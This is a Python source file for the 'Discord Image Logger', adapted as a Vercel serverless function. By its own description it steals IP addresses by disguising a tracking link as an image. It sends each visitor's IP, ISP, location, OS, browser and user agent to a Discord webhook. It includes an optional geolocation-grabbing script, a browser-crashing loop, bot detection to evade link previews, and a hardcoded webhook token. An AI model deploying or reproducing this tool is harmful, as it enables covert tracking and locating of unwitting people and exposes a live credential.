# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted
# Modified for Vercel serverless functions

from urllib import parse
import traceback, requests, base64, httpagentparser
import os
import json

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/1540303370693382204/d9TYctAed6gOcl3xdyV7Vy_FtJP3h17wSjRXZRCPutNcxxv4Hq8ValygcF9UydF1glwb"),
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,

    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent) if ip else False
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                })
            except:
                pass
        return None

    ping = "@everyone"
    info = {"proxy": False, "hosting": False, "isp": "Unknown", "as": "Unknown", 
            "country": "Unknown", "regionName": "Unknown", "city": "Unknown", 
            "lat": 0, "lon": 0, "timezone": "Unknown/Unknown", "mobile": False}
    
    if ip:
        try:
            info_response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
            if info_response.status_code == 200:
                info = info_response.json()
        except:
            pass
    
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return None
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"):
                return None
        elif config["antiBot"] == 3:
            return None
        elif config["antiBot"] == 2:
            if not info.get("proxy"):
                ping = ""
        elif config["antiBot"] == 1:
            ping = ""

    os_info, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', 0))+', '+str(info.get('lon', 0)) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', 'Unknown/Unknown') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if '/' in info.get('timezone', 'Unknown') else 'Unknown'})`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os_info}`
> **Browser:** `{browser}`

**User Agent:**
    {useragent if useragent else 'Unknown'}
}
        ],
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except:
        pass
    
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

# Vercel serverless function handler
def handler(request):
    try:
        # Parse query parameters
        path = request.path
        query_params = dict(parse.parse_qsl(parse.urlsplit(path).query))
        
        # Get IP and user agent from request
        ip = request.headers.get('x-forwarded-for', '').split(',')[0].strip() if request.headers.get('x-forwarded-for') else 'Unknown'
        user_agent = request.headers.get('user-agent', '')
        
        # Check for blacklisted IPs
        if ip.startswith(blacklistedIPs):
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'text/html'},
                'body': ''
            }
        
        # Determine image URL
        if config["imageArgument"] and (query_params.get("url") or query_params.get("id")):
            try:
                url = base64.b64decode(query_params.get("url") or query_params.get("id")).decode()
            except:
                url = config["image"]
        else:
            url = config["image"]
        
        # Check if it's a bot
        bot = botCheck(ip, user_agent)
        
        # Handle bot requests
        if bot:
            if config["buggedImage"]:
                return {
                    'statusCode': 200,
                    'headers': {'Content-Type': 'image/jpeg'},
                    'body': base64.b85encode(binaries["loading"]).decode()
                }
            else:
                return {
                    'statusCode': 302,
                    'headers': {'Location': url},
                    'body': ''
                }
        
        # Process location data if provided
        result = None
        if query_params.get("g") and config["accurateLocation"]:
            try:
                location = base64.b64decode(query_params.get("g")).decode()
                result = makeReport(ip, user_agent, location, path.split("?")[0], url)
            except:
                result = makeReport(ip, user_agent, endpoint=path.split("?")[0], url=url)
        else:
            result = makeReport(ip, user_agent, endpoint=path.split("?")[0], url=url)
        
        # Prepare response
        message = config["message"]["message"]
        
        if config["message"]["richMessage"] and result:
            message = message.replace("{ip}", ip)
            message = message.replace("{isp}", result.get('isp', 'Unknown'))
            message = message.replace("{asn}", result.get('as', 'Unknown'))
            message = message.replace("{country}", result.get('country', 'Unknown'))
            message = message.replace("{region}", result.get('regionName', 'Unknown'))
            message = message.replace("{city}", result.get('city', 'Unknown'))
            message = message.replace("{lat}", str(result.get('lat', 0)))
            message = message.replace("{long}", str(result.get('lon', 0)))
            message = message.replace("{timezone}", f"{result.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ') if '/' in result.get('timezone', 'Unknown/Unknown') else 'Unknown'} ({result.get('timezone', 'Unknown').split('/')[0] if '/' in result.get('timezone', 'Unknown') else 'Unknown'})")
            message = message.replace("{mobile}", str(result.get('mobile', False)))
            message = message.replace("{vpn}", str(result.get('proxy', False)))
            message = message.replace("{bot}", str(result.get('hosting', False) if result.get('hosting') and not result.get('proxy') else 'Possibly' if result.get('hosting') else 'False'))
            message = message.replace("{browser}", httpagentparser.simple_detect(user_agent)[1] if user_agent else "Unknown")
            message = message.replace("{os}", httpagentparser.simple_detect(user_agent)[0] if user_agent else "Unknown")
        
        # Determine response content
        if config["redirect"]["redirect"]:
            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
        elif config["message"]["doMessage"]:
            data = message
        elif config["crashBrowser"]:
            data = message + '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
        else:
            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''
        
        # Add location script if needed
        if config["accurateLocation"]:
            data += """<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
        
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'text/html'},
            'body': data
        }
        
    except Exception as e:
        reportError(traceback.format_exc())
        return {
            'statusCode': 500,
            'headers': {'Content-Type': 'text/html'},
            'body': '500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.'
        }

# Vercel entry point
app = handler
